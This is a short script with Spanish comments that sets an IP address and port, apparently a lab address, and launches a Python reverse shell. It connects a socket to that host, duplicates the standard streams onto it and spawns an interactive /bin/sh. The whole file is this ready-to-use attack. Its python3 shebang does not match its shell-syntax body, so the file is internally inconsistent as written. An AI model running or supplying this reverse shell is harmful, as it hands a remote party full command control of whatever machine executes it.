#!/usr/bin/python3
# Configura tu IP y puerto aquí
IP="192.168.56.102"
PORT=8080

# Crea el script de Python directamente en memoria y lo ejecuta
python3 -c "
import socket, subprocess, os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\"$IP\", $PORT));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call([\"/bin/sh\", \"-i\"])
"
